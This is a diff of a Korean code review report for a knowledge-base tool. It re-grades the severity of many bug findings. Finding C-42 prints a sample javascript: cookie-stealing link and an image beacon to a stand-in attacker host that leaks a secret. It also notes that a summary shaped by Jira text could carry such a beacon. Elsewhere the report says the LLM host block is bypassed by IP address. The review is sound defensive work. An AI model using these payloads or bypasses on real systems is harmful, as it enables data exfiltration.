@@ -5,7 +5,8 @@
 
 ## 요약
 
-- 항목 57개: 높음 0, 중간 16, 낮음 41. 버그라고 쓴 항목은 모두 `review/repro/`의 재현 파일이 현재 코드에서 실패한다(추정 항목 제외).
+- 항목 57개: 높음 2, 중간 29, 낮음 26. 버그라고 쓴 항목은 모두 `review/repro/`의 재현 파일이 현재 코드에서 실패한다(추정 항목 제외).
+- [정정, 1단계-2 상호 검증] 처음 집계는 높음 0, 중간 16, 낮음 41이었다. 코디네이터 기준(높음: 데이터 손실·사람 파일 침범, 중간: 잘못된 결과·복구 가능한 실패·문서/요구 불일치, 낮음: 품질·정리)으로 17개를 다시 매겼다. 바꾼 항목은 제목에 `[정정: 이전→이후]`로 표시했고 목록은 `review/CROSS-claude.md` 끝에 있다. 일부러 만들어야 하는 특이 입력(NFD·NEL·CR 전용·전각 숫자·`\r\r\n`)만 내는 문제와 발생 조건이 사실상 없는 문제(C-11)는 낮음으로 두었다.
 - 가장 큰 위험은 데이터·흐름 쪽이다: 캡처가 daily를 제자리에서 덮어써 다른 프로세스가 0바이트를 읽는다(C-03), `-`로 시작하는 입력이 argparse에 막히거나 도움말을 출력하고 성공(0)으로 끝난다(C-02), 일감 하나의 403이 전체 동기화를 영구히 막는다(C-30).
 - serve 상주 서버 자체는 튼튼하다(깨진 입력·8MB 입력·파이프라인·강제 종료 뒤 재기동·KB_AGENT 모두 통과). 다만 요청 시간 초과(30초)가 잠금 대기(60초)·Jira 시간 초과(30초)보다 짧아 서버를 죽이고 같은 명령을 다시 돈다(C-01).
 - 회사 모드의 공개 LLM 호스트 차단은 대소문자·끝 점·userinfo·포트·IDN·환경 변수 우회 모두 막았다. IP 주소만 열려 있다(C-43).
@@ -70,7 +71,7 @@
 - 제안: Lua에서 `--body=<값>`, `--comment=`, `--summary=`, `--description=`, `--jql=` 꼴로 넘기고, 위치 인수 앞에는 `--`를 넣는다(`search --root V -- <질의>`, `act assign --root V -- KEY USER`). 이 꼴은 파싱이 맞음을 확인했다.
 - 수정 파일: `nvim/lua/work-kb/jira.lua`, `nvim/lua/work-kb/search.lua`, `tests/nvim/spec/jira_spec.lua`, `tests/nvim/spec/search_spec.lua`.
 
-**C-03 · `nvim/lua/work-kb/fileio.lua:62-72`, `:531` · 정확성 · 중간**
+**C-03 · `nvim/lua/work-kb/fileio.lua:62-72`, `:531` · 정확성 · 높음 [정정: 중간→높음]**
 - 문제: 캡처가 daily를 `fs_open(path, "w")`(잘라내기) 뒤 제자리에 쓴다. 쓰는 사이 다른 프로세스(예약 `link`, Obsidian, 동기화 도구)는 빈 파일이나 반쪽 파일을 읽는다. 잘라낸 뒤 쓰기 전에 Neovim이 죽거나 디스크가 차면 그날 기록 전체를 잃는다. Python 쪽은 모두 `core.atomic_write`(임시 파일+교체)다.
 - 근거: `C-03_capture_nonatomic_write.lua` → `file size before=1397822 bytes; 141 captures; smallest size a concurrent reader saw=0`.
 - 제안: 같은 폴더의 임시 파일에 쓰고 `uv.fs_rename`으로 교체한다(libuv는 Windows에서 MOVEFILE_REPLACE_EXISTING). 공유 위반이면 Python처럼 잠깐 다시 시도한다. 교체 직전에 디스크 바이트가 읽은 값과 같은지 한 번 더 본다.
@@ -94,7 +95,7 @@
 - 제안: 조각에서만 `\n`을 찾고 조각을 표에 모아 한 번에 잇는다.
 - 수정 파일: `nvim/lua/work-kb/server.lua`.
 
-**C-07 · `uninstall.ps1:162-196`, `install.ps1:342-353` · 정확성 · 낮음**
+**C-07 · `uninstall.ps1:162-196`, `install.ps1:342-353` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: manifest는 `%LOCALAPPDATA%\work-kb` 하나뿐인데 uninstall은 그 값이 **이 저장소**를 가리키는지 보지 않는다. 클론 A로 설치하고 클론 B로 다시 설치한 뒤 A에서 uninstall하면 B를 가리키는 WORK_KB_ROOT를 지운다. nvim-config는 그 뒤 work-kb를 불러오지 않는다.
 - 근거: `C-07_uninstall_other_clone.ps1`(이음매만 사용) → `WORK_KB_ROOT before A uninstall: …\cloneB` / `FAIL: uninstall from clone A removed the variable that points at clone B`.
 - 제안: `entry.value`가 `$RepoRoot`와 같을 때만 되돌리고, 아니면 "다른 클론이 설정함, 남김"으로 보고한다. manifest의 `repo`도 항목별로 기록한다.
@@ -144,7 +145,7 @@
 - 제안: `kind=="link"`이고 `M.link_key(value)`가 있으면 key 경로로 돌린다.
 - 수정 파일: `nvim/lua/work-kb/open.lua`.
 
-**C-15 · `nvim/lua/work-kb/jira.lua:107-117` · 정확성 · 낮음**
+**C-15 · `nvim/lua/work-kb/jira.lua:107-117` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: `configured_dir`가 실제 경로로 풀지 않은 `cfg.root`를 쓴다. setup에 root 없이 정션 아래에서 불러오면 `t`로 연 daily에서 `p`가 "daily 파일에서만" 오류로 거부되고, `c`가 `--from-line` 대신 `--body`로 간다.
 - 근거: `C-15_junction_root.ps1`(임시 정션, 끝나면 정션만 삭제) → `jira.daily_relative(daily file) -> nil (expected daily/2026-11-05.md)`.
 - 제안: `init.in_vault`처럼 `pcall(config.root)`을 쓴다.
@@ -170,19 +171,19 @@
 
 ### C. Python 공통 라이브러리 (notes, managed, frontmatter, config, core)
 
-**C-19 · `scripts/lib/notes.py:114-120`, `scripts/daily_prepare.py:146-178` · 정확성 · 중간**
+**C-19 · `scripts/lib/notes.py:114-120`, `scripts/daily_prepare.py:146-178` · 정확성 · 높음 [정정: 중간→높음]**
 - 문제: 첫 줄이 `---`이고 닫는 줄이 없는 daily를 `iter_lines`가 파일 전체 front matter(코드)로 본다(`frontmatter._locate`는 front matter가 없다고 본다). `ensure_skeleton`이 `## 기록`을 못 찾아 실행할 때마다 `## 기록`을 하나씩 더 붙인다(예약 prepare·Neovim `t`가 매일 부른다). 같은 파일은 이월·link 멘션에서도 빠진다.
 - 근거: `C-19_skeleton_leading_hr.py` → `'## 기록' count after each run: [2, 3, 4]`. `C-19_unclosed_frontmatter_all_code.py` → 모든 줄 `in_code=True`.
 - 제안: `iter_lines`가 `frontmatter._locate(data)`로 본문 시작을 정하고 그 앞만 front matter로 본다.
 - 수정 파일: `scripts/lib/notes.py`, `tests/test_notes.py`, `tests/test_daily_prepare.py`.
 
-**C-20 · `scripts/lib/notes.py:23`, `:122-129` · 정확성 · 낮음**
+**C-20 · `scripts/lib/notes.py:23`, `:122-129` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: 코드 울타리를 앞 3글자만 기억한다. ```` ```` ```` 블록 안의 ```` ``` ````나 ```` ```python ```` 줄이 블록을 닫아, 코드 안의 맨 키를 `[[KB-1]]`로 바꾼다(daily를 기계가 고치는 유일한 예외에서 규칙 위반).
 - 근거: `C-20_link_fence4.py` → `AssertionError: bare key inside a ```` fenced code block was normalized`.
 - 제안: CommonMark처럼 여는 울타리 문자와 길이를 기억하고, 같은 문자·그 이상 길이·뒤에 다른 글자 없는 줄만 닫는다.
 - 수정 파일: `scripts/lib/notes.py`, `tests/test_link.py`.
 
-**C-21 · `scripts/lib/notes.py:147-173` · 정확성 · 낮음**
+**C-21 · `scripts/lib/notes.py:147-173` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: `section_span`이 코드 울타리를 보지 않는다. `## 기록` 안 코드 블록의 `## …` 줄에서 절이 끝나 그 뒤 할 일이 이월되지 않고 키도 정규화되지 않는다.
 - 근거: `C-21_heading_in_fence.py` → `task after a fenced block containing '## ' was not carried over`.
 - 제안: `iter_lines`의 `in_code`를 써서 코드 안 제목을 건너뛴다.
@@ -212,13 +213,13 @@
 - 제안: `rb"---[ \t\r]*"`.
 - 수정 파일: `scripts/lib/frontmatter.py`, `tests/test_frontmatter.py`.
 
-**C-26 · `scripts/daily_prepare.py:149-151`, `scripts/lib/notes.py:161` · 정확성 · 낮음**
+**C-26 · `scripts/daily_prepare.py:149-151`, `scripts/lib/notes.py:161` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: NFD로 저장된 `## 기록` 제목을 못 알아봐 제목을 하나 더 만든다.
 - 근거: `C-26_nfd_heading.py` → `AssertionError`(제목 2개, `section_span … None`).
 - 제안: 제목 비교 양쪽을 NFC로.
 - 수정 파일: `scripts/daily_prepare.py`, `scripts/lib/notes.py`.
 
-**C-27 · `scripts/lib/config.py:401-410` · 정확성 · 낮음**
+**C-27 · `scripts/lib/config.py:401-410` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: 환경 변수 덮어쓰기를 `yaml.safe_load`로 읽어 `KB_CONFLUENCE_TITLE_PREFIX="[TEAM] "`이 `['TEAM']`(목록)이 되고 끝 공백도 잃는다. 게시 제목이 `['TEAM']…`로 시작한다.
 - 근거: `C-27_env_override_list.py` → `parsed: ['TEAM'] -> title would start with "['TEAM']"`.
 - 제안: 목록형 키(`project_keys`, `push_globs`, blocklist)만 목록으로 읽고 나머지는 문자열로 둔다. 아니면 문서에 따옴표 규칙을 적는다.
@@ -250,7 +251,7 @@
 - 제안: id 조회가 네트워크 오류이고 인수가 숫자면 `{transition_id}`로 pending에 넣는다(틀린 id는 보낼 때 500→failed로 이미 처리됨). 아니면 DECISIONS에 한계로 적는다.
 - 수정 파일: `scripts/jira_act.py`, `tests/test_jira_act.py`.
 
-**C-32 · `scripts/status.py:92-117`, `:356` · 정확성 · 낮음**
+**C-32 · `scripts/status.py:92-117`, `:356` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: 보내던 프로세스가 죽은 `sending` 레코드를 `act list`는 "불확실"(사람 판단 필요)로 보이는데 `status`는 "전송 중 1개"로 계속 보인다.
 - 근거: `C-32_status_sending.py` → `MISMATCH (list=uncertain, status=전송 중): True`.
 - 제안: `jira_act`의 보이는 상태 계산(`state_of`, `stale_after`)을 `lib/outbox.py`로 옮겨 status도 쓰고, "불확실 N개"를 보인다.
@@ -268,7 +269,7 @@
 - 제안: 두 호출을 `try/except core.KbError`로 감싸 경고만 남기고(588-592의 `sync_key` 처리와 같이), 중복 검사에 `linked: false`인 done 승격도 넣는다.
 - 수정 파일: `scripts/jira_act.py`, `tests/test_jira_act.py`.
 
-**C-35 · `scripts/wheels.py:222` · 정확성 · 낮음**
+**C-35 · `scripts/wheels.py:222` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: D57은 스크립트가 직접 실행돼도 스스로 거부한다고 한다. `wheels.py`만 `refuse_if_agent`가 없다(init·demo·schedule·push·compile·jira_act는 있다).
 - 근거: `C-35_wheels_agent.py` → `KB_AGENT=1 kb.py wheels --dry-run -> exit 7; python scripts/wheels.py --dry-run -> exit 0`.
 - 제안: `wheels.main` 앞에서 `core.refuse_if_agent("wheels")`.
@@ -306,13 +307,13 @@
 - 제안: `inbox/*.md`, `wiki/**/*.md`의 embed 대상도 모으거나, 어떤 `.md`든 참조하는 이미지는 이름을 바꾸지 않는다.
 - 수정 파일: `scripts/ingest_images.py`, `tests/test_ingest_images.py`.
 
-**C-41 · `scripts/ingest_images.py:221` · 정확성 · 낮음**
+**C-41 · `scripts/ingest_images.py:221` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: `inbox/회의.png` 옆에 사용자가 쓴 `inbox/회의.md`가 있으면 사이드카가 있는 것으로 보고 영영 처리하지 않는다. status의 미처리 이미지 수도 0이다.
 - 근거: 같은 파일 → `C-41: inbox image with a same-name user note is never ingested`.
 - 제안: front matter에 `source_image`가 있을 때만 사이드카로 본다.
 - 수정 파일: `scripts/ingest_images.py`.
 
-**C-42 · `scripts/confluence_push.py:446-473` · 개선 · 낮음 (Confluence 쪽 동작은 추정)**
+**C-42 · `scripts/confluence_push.py:446-473` · 개선 · 중간 [정정: 낮음→중간] (Confluence 쪽 동작은 추정)**
 - 문제: 날 HTML은 잘 이스케이프하지만 Markdown 링크·이미지는 거르지 않는다. `[x](javascript:…)`, `data:` 링크, `![](https://외부/?d=…)`가 storage 형식에 그대로 간다. Jira 글에 영향받은 T3 요약이 외부 이미지(비컨)를 Confluence로 실을 수 있다.
 - 근거: `C-42_storage_links.py` → `<a href="javascript:alert(document.cookie)">`, `<img … src="https://attacker.example/c?d=SECRET" />`. Confluence DC가 이를 스스로 거르는지는 확인 못 함.
 - 제안: href는 http/https/mailto만, 외부 `src`의 `<img>`는 글자로 바꾼다.
@@ -330,7 +331,7 @@
 - 제안: 재시도 메시지에 검증 오류를 덧붙인다.
 - 수정 파일: `scripts/lib/llm_client.py`.
 
-**C-45 · `scripts/lib/llm_detect.py` · 정확성 · 낮음**
+**C-45 · `scripts/lib/llm_detect.py` · 정확성 · 중간 [정정: 낮음→중간]**
 - 문제: 지시서 §6.11 "전체 탐지는 10회 이하 호출". POST는 10회로 묶였지만(mock 계수 5–7회), `GET /models`는 세지 않고 429면 2회까지 다시 시도해 최악 13회다.
 - 근거: 서브에이전트 mock 계수(재현 파일 없음, 코드 확인).
 - 제안: GET도 세거나 재시도 없이 보낸다.
@@ -344,7 +345,7 @@
 - 제안: 하나로 정해(실제로 0.12 API를 쓰면 0.12) 코드 세 곳과 문서를 맞추고 DECISIONS 6장에 적는다.
 - 수정 파일: `install.ps1`, `scripts/doctor.py`, `nvim/lua/work-kb/health.lua`, `README.md`, `docs/DEPLOY.md`.
 
-**C-47 · `docs/USER-GUIDE.md:219` · 정확성(문서) · 낮음**
+**C-47 · `docs/USER-GUIDE.md:219` · 정확성(문서) · 중간 [정정: 낮음→중간]**
 - 문제: "공백은 AND"라고 쓰지만 순서는 fzf-lua → rg(`--fixed-strings`, 구 전체) → `kb.py search`(AND)다. rg가 있으면 같은 질의의 결과가 다르다.
 - 근거: `C-47_search_and.lua` → `rg 'front 캐시' -> 0건`, `kb 'front 캐시' -> 1건`.
 - 제안: 문서를 실제 순서대로 고치거나, rg에 낱말마다 `-e`를 주지 말고 kb.py와 같은 AND 의미를 맞춘다.
@@ -368,19 +369,19 @@
 - 제안: 우선순위에 6장을 넣고, §0을 Neovim 확인 항목으로 바꾸고, §1에 위 행을 더하고, 6장에 "nvim 판에서 대체된 기록" 목록을 둔다.
 - 수정 파일: `docs/DECISIONS.md`.
 
-**C-51 · `docs/DEPLOY.md:4`, `:117`, `tests/test_docs.py:5`, `:38`, `docs/DECISIONS.md:277` · 정확성(문서) · 낮음**
+**C-51 · `docs/DEPLOY.md:4`, `:117`, `tests/test_docs.py:5`, `:38`, `docs/DECISIONS.md:277` · 정확성(문서) · 중간 [정정: 낮음→중간]**
 - 문제: 지시서 §9는 DEPLOY에 "그대로" 싣는다고 한다. 7단계는 Neovim용으로 다시 썼고 시험의 CHECKLIST도 바꿨는데, DEPLOY 4행·test_docs 5행·DECISIONS 277행은 여전히 "원문 그대로"라고 한다.
 - 근거: 각 줄.
 - 제안: DECISIONS §1에 변경 행을 두고 세 곳 문구를 "7단계는 Neovim에 맞게 고침"으로 바꾼다.
 - 수정 파일: `docs/DEPLOY.md`, `docs/DECISIONS.md`, `tests/test_docs.py`.
 
-**C-52 · `README.md:9`, `docs/USER-GUIDE.md:61` · 정확성(문서) · 낮음**
+**C-52 · `README.md:9`, `docs/USER-GUIDE.md:61` · 정확성(문서) · 중간 [정정: 낮음→중간]**
 - 문제: "Python 쪽은 두 브랜치가 같다"지만 `serve.py`(+345행), `kb.py` serve, `doctor.py` Neovim 점검, `KB_SKIP_NVIM`, `deploy_check.py` 필수 파일이 다르다.
 - 근거: `git diff main...HEAD -- scripts`.
 - 제안: "거의 같다. nvim 판에는 `kb.py serve`와 Neovim 점검이 더 있다".
 - 수정 파일: `README.md`, `docs/USER-GUIDE.md`.
 
-**C-53 · `docs/USER-GUIDE.md:214`, `:225`, 5.4절, `AGENTS.md:123` · 개선(문서) · 낮음**
+**C-53 · `docs/USER-GUIDE.md:214`, `:225`, 5.4절, `AGENTS.md:123` · 개선(문서) · 중간 [정정: 낮음→중간]**
 - 문제: (1) `c`가 "한 줄 입력"이라 쓰지만 실제는 `*work-kb-capture*` 분할 버퍼(`C-c C-c` 저장, `C-c C-k` 취소, 여러 줄 가능). (2) `G`는 "파일을 바꾸지 않는다"만 있고 LLM을 호출한다는 말이 없다(회사 환경·비용). (3) 5.4 Lua 예시는 역슬래시 경로를 그대로 넣으면 오류다. (4) AGENTS.md는 status가 "프로필별 연결·탐지"를 보인다고 하지만 status는 연결을 확인하지 않는다(지시서 §6.10도 연결 상태를 요구).
 - 근거: `capture.lua:104-106`, `:153-157`; `compile --help`; `status.py`(네트워크 없음).
 - 제안: 각 문구를 고친다. (4)는 doctor 결과 캐시를 status에 보이거나 문구를 고친다.
